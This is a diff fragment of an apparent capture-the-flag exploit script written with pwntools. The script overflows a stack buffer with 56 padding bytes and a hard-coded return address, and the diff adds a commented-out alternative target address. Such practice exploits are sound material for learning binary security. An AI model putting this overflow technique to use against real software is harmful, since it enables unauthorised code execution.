@@ -24,6 +24,7 @@ io.sendline('1')
 io.recvuntil('[*] Input: ')
 
 payload = 'A'*(56) + p64(0x400b12)
+#payload = 'A'*(56) + p64(0x400afa)
 io.sendline(payload)
 print io.recvall()
 
